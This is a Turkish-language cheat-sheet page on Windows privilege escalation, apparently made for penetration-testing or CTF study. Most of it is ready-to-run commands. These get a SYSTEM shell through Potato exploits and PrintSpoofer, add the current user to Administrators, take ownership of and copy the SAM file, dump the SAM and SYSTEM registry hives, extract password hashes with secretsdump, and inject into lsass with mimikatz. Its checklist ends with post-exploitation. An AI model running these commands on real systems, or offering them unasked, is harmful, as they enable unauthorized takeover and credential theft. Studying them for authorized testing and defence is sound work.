---
layout: page
title: Windows Privilege Escalation
permalink: /windows/privesc/
---

# Windows Privilege Escalation

Privilege Escalation, düşük haklara sahip bir kullanıcıdan yüksek haklara (genellikle Administrator/SYSTEM) ulaşma tekniğidir.

---

## 🎯 1. Adım: Privilegeleri Kontrol Etme

Makineye girdikten sonra ilk yapılacak şey mevcut privilegeleri kontrol etmektir.

### Komutu Çalıştır:
```cmd
whoami /all
```

Bu komut aşağıdaki bilgileri gösterir:
- **User SID** - Kullanıcı Kimliği
- **Group Memberships** - Grup üyelikleri
- **Privileges** - Mevcut yetkiler

---

---

## ⚡ 2. Kritik Privileges

Aşağıdaki privileges varsa **Privilege Escalation** yapılabilir:

> **Detaylı bilgi için:** [Kritik Privileges Sayfası](/windows/privileges/)

- **SeImpersonatePrivilege** ⭐ - Başka kullanıcı kimliğine bürünme
- **SeTakeOwnership** - Dosya sahipliğini alma
- **SeDebugPrivilege** - Process debug yapma
- **SeBackupPrivilege** - Sistem dosyalarını yedekleme
- **SeRestorePrivilege** - Restore ve dosya izni değiştirme

---

## 🟢 Local Admin Olma (Hızlı Yöntem)

Eğer **Administrator** grubu içindeki bir kullanıcı kontrolünde iseniz, kendinizi Administrators grubuna ekleyebilirsiniz:

### 🖥️ CMD ile Local Admin Ekleme:

```cmd
# Mevcut kullanıcıyı kontrol et
whoami

# Örneğin: DESKTOP-ABC123\John kullanıcısını admin yapma
net localgroup Administrators DESKTOP-ABC123\John /add

# Sonrası PowerShell'i admin olarak başlatmak gerekebilir
```

### 💻 PowerShell ile Local Admin Ekleme:

```powershell
# Mevcut kullanıcıyı öğren
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Write-Host "Mevcut Kullanıcı: $currentUser"

# Kendinizi admin grubuna ekle
Add-LocalGroupMember -Group "Administrators" -Member $currentUser

# Başarı kontrolü
Get-LocalGroupMember -Group "Administrators" | Select-Object Name
```

### ⚡ PowerShell One-Liner:

```powershell
Add-LocalGroupMember -Group "Administrators" -Member (whoami) -ErrorAction SilentlyContinue; Write-Host "Admin eklendi!"
```

### 🔐 Başarı Kontrolü:

```cmd
# Admin olup olmadığını kontrol et
net localgroup Administrators

# veya PowerShell ile
whoami /groups | findstr /i "administrator"
```

**⚠️ Not:** Komut başarısı için mevcut kullanıcının Administrators grubunda olması gerekebilir. Privilege Escalation ile SYSTEM'e ulaştıktan sonra kolay olur.

---

## 🔴 SeImpersonatePrivilege - Privilege Escalation

**SeImpersonatePrivilege** varsa aşağıdaki araçlar kullanılabilir:

### 1️⃣ **PrintSpoofer** (En Etkili)

#### 📋 Adım 1: PrintSpoofer'ı İndir
```cmd
# GitHub'dan indir
curl -O https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer.exe
```

#### 🖥️ CMD ile Kullan:
```cmd
PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -i -c "cmd.exe /c whoami"
```

#### 💻 PowerShell ile Kullan:
```powershell
.\PrintSpoofer.exe -i -c powershell.exe
.\PrintSpoofer.exe -i -c "powershell.exe -c whoami"
```

**Flags Açıklaması:**
- `-i` = Interactive (etkileşimli shell açar)
- `-c` = Command (belirtilen komutu çalıştır)

---

### 2️⃣ **Potato Exploits**

#### **JuicyPotato**

🖥️ CMD ile:
```cmd
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami"
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\temp\whoami.txt"
```

💻 PowerShell ile:
```powershell
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-c whoami"
.\JuicyPotato.exe -t * -p powershell.exe -a "-c 'whoami | Out-File C:\temp\whoami.txt'"
```

#### **RoguePotato**

🖥️ CMD ile:
```cmd
RoguePotato.exe -r 127.0.0.1 -l 9999 -c "{6d18ad12-bde3-4393-b311-099c1abed7d0}" -e "cmd.exe" -p "C:\temp"
```

💻 PowerShell ile:
```powershell
.\RoguePotato.exe -r 127.0.0.1 -l 9999 -c "{6d18ad12-bde3-4393-b311-099c1abed7d0}" -e "powershell.exe"
```

---

### 3️⃣ **GodPotato** (En Yeni)

🖥️ CMD ile:
```cmd
GodPotato.exe -cmd "cmd.exe /c whoami"
GodPotato.exe -cmd "cmd.exe /c whoami > C:\temp\output.txt"
```

💻 PowerShell ile:
```powershell
.\GodPotato.exe -cmd "powershell.exe -c whoami"
.\GodPotato.exe -cmd "powershell.exe -c 'whoami | Out-File C:\temp\output.txt'"
```

---

## 🔴 SeTakeOwnership - Privilege Escalation

**SeTakeOwnership** varsa dosya sahipliğini alıp modifiye edebiliriz.

### Örnek: SAM Dosyasını Ele Geçirme

🖥️ CMD ile:
```cmd
# SAM dosyasının sahibini al
takeown /F C:\Windows\System32\config\SAM

# İzinleri değiştir
icacls C:\Windows\System32\config\SAM /grant "%username%":F

# Artık dosyayı kopyalayabilirsin
copy C:\Windows\System32\config\SAM C:\temp\SAM
```

💻 PowerShell ile:
```powershell
# SAM dosyasının sahibini al
cmd /c "takeown /F C:\Windows\System32\config\SAM"

# İzinleri değiştir
cmd /c "icacls C:\Windows\System32\config\SAM /grant '%username%':F"

# Hash'leri kopyala
Copy-Item "C:\Windows\System32\config\SAM" -Destination "C:\temp\SAM" -Force
```

---

## 🔴 SeDebugPrivilege - Privilege Escalation

**SeDebugPrivilege** varsa SYSTEM process'ine erişebiliriz.

### Metode: Process Injection

🖥️ CMD ile:
```cmd
# SYSTEM çalışan process'i bul (örnek: lsass.exe)
tasklist /v | findstr /i system

# Mimikatz kullanarak inject et
mimikatz.exe "privilege::debug" "process::inject /pid:XXXXXX /program:cmd.exe" exit
```

💻 PowerShell ile:
```powershell
# Process ID'sini al
$lsass = Get-Process lsass | Select-Object -ExpandProperty Id

# PowerShell aracılığıyla enjekte et
& ".\mimikatz.exe" "privilege::debug" "process::inject /pid:$lsass /program:powershell.exe" exit
```

---

## 🔴 SeBackupPrivilege & SeRestorePrivilege

Bu privileges ile sistem dosyalarına erişip yetkilendirme değiştirebiliriz.

### SAM & SYSTEM Hive'ı Kopyalama

🖥️ CMD ile:
```cmd
# Registry hive'larını yedekle
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Hashleri extract et (offline)
secretsdump.py -sam C:\temp\SAM -system C:\temp\SYSTEM LOCAL
```

💻 PowerShell ile:
```powershell
# Registry hive'larını yedekle
cmd /c "reg save HKLM\SAM C:\temp\SAM"
cmd /c "reg save HKLM\SYSTEM C:\temp\SYSTEM"

# Hash extract et
python secretsdump.py -sam C:\temp\SAM -system C:\temp\SYSTEM LOCAL
```

---

## 🛠️ Troubleshooting

| Hata | Çözüm |
|------|-------|
| `Access Denied` | Farklı bir araç dene, UAC bypass lazım olabilir |
| `Token Handle 0` | Service olarak çalışan kod gerekli |
| `Failed to impersonate` | PrintSpoofer Print Spooler service'in açık olması gerekir |

---

## 📋 Kontrol Listesi

- [ ] `whoami /all` ile privileges kontrol ettim
- [ ] SeImpersonatePrivilege/SeTakeOwnership var mı kontrol ettim
- [ ] Uygun araç seçtim (PrintSpoofer, JuicyPotato, etc.)
- [ ] CMD/PowerShell'de çalıştırıp SYSTEM shell açtım
- [ ] Post-exploitation işlemleri başlattım

---

[← Windows Rehberi'ne Dön](/windows/)